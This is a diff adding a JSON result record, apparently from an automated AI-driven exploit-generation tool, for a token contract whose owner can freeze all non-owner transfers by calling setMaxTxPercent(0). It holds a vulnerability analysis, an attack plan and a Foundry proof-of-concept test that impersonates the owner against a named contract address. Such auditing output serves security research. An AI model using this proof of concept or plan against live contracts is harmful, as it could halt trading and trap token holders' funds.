@@ -1,0 +1,55 @@
+{
+  "project_id": "teg",
+  "target_address": "0xc35B753d5F2e86cae7C42f755eb1812855aB10c0",
+  "finding_id": 0,
+  "status": "SUCCESS",
+  "violation_target": {
+    "target_address": "0xc35B753d5F2e86cae7C42f755eb1812855aB10c0",
+    "vulnerability_type": "Owner-controlled Transaction Freeze",
+    "violation_category": "LOGIC",
+    "finding_id": 0,
+    "preconditions": [
+      {
+        "type": "role",
+        "description": "Attacker must be the contract owner.",
+        "token_address": null,
+        "min_amount": null
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": null,
+      "logic_check": {
+        "target_variable": "_maxTxAmount",
+        "operator": "==",
+        "expected_value": "0"
+      }
+    },
+    "exploit_hint": "The attacker, who must be the contract owner, calls the `setMaxTxPercent` function with an argument of 0. This sets the `_maxTxAmount` state variable to 0. Consequently, any subsequent transfer attempt by a non-owner address will fail the requirement `amount <= _maxTxAmount` inside the `_transfer` function, effectively halting all trading for regular users."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface Iteg {\n        function setMaxTxPercent(uint256 maxTxPercent) external;\n        function _maxTxAmount() external view returns (uint256);\n        function owner() external view returns (address);\n    }\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xc35B753d5F2e86cae7C42f755eb1812855aB10c0;\n    address attacker = address(this);\n    Iteg target;\n    address owner;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        target = Iteg(TARGET);\n        owner = target.owner();\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        vm.startPrank(owner);\n        \n                // The owner calls setMaxTxPercent with 0 to freeze transfers\n                target.setMaxTxPercent(0);\n        \n                vm.stopPrank();\n        \n                // Oracle Check: Verify that _maxTxAmount is now 0\n                assertEq(target._maxTxAmount(), 0);\n        assertEq(target._maxTxAmount(), 0, \"Logic Exploit Failed: State not tampered\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The vulnerability lies in the `setMaxTxPercent` function of the `TEGPAY` contract, which is protected by an `onlyOwner` modifier. The contract owner is hardcoded in the `Ownable` constructor to `0xBd51b6D98574327734C1621A7283778c5e6Af86e`. The `setMaxTxPercent` function allows the owner to set the `_maxTxAmount`, which is the maximum amount of tokens that can be transferred in a single transaction by non-owner addresses. The calculation is `_maxTxAmount = _tTotal.mul(maxTxPercent).div(10**3)`. If the owner calls this function with `maxTxPercent = 0`, the `_maxTxAmount` will be set to 0. The `_transfer` function contains the check `if(from != owner() && to != owner()) require(amount <= _maxTxAmount, \"...\");`. With `_maxTxAmount` set to 0, any transfer with an amount greater than 0 between non-owner addresses will revert, effectively freezing all trading activities for regular users.",
+      "attack_strategy": "The attack strategy is to impersonate the hardcoded contract owner and call the `setMaxTxPercent` function with an argument of 0. This will set the `_maxTxAmount` state variable to 0, thus freezing token transfers for all non-owner accounts. The exploit's success is verified by checking if `_maxTxAmount` is indeed 0 after the function call.",
+      "step_by_step_plan": "1. Define an interface for the target contract that includes the `setMaxTxPercent(uint256)` function and the public state variable `_maxTxAmount`. 2. In the `setUp` function, instantiate the target contract and identify the owner address from the source code (`0xBd51b6D98574327734C1621A7283778c5e6Af86e`). 3. In the `testExploit` function, impersonate the owner's address using `vm.startPrank()`. 4. While impersonating the owner, call the `setMaxTxPercent(0)` function on the target contract. 5. Stop impersonating the owner using `vm.stopPrank()`. 6. Assert that the public state variable `_maxTxAmount` is now equal to 0, which confirms the success of the exploit and satisfies the test oracle.",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface Iteg {\n        function setMaxTxPercent(uint256 maxTxPercent) external;\n        function _maxTxAmount() external view returns (uint256);\n        function owner() external view returns (address);\n    }\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0xc35B753d5F2e86cae7C42f755eb1812855aB10c0;\n    address attacker = address(this);\n    Iteg target;\n    address owner;\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        target = Iteg(TARGET);\n        owner = target.owner();\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        vm.startPrank(owner);\n        \n                // The owner calls setMaxTxPercent with 0 to freeze transfers\n                target.setMaxTxPercent(0);\n        \n                vm.stopPrank();\n        \n                // Oracle Check: Verify that _maxTxAmount is now 0\n                assertEq(target._maxTxAmount(), 0);\n        assertEq(target._maxTxAmount(), 0, \"Logic Exploit Failed: State not tampered\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 0,
+      "error": null,
+      "feedback": null,
+      "duration_seconds": 58.9780809879303,
+      "prompt_tokens": 18461,
+      "completion_tokens": 4455,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 58.98128008842468,
+  "total_prompt_tokens": 18461,
+  "total_completion_tokens": 4455,
+  "total_cost": 0.0
+}
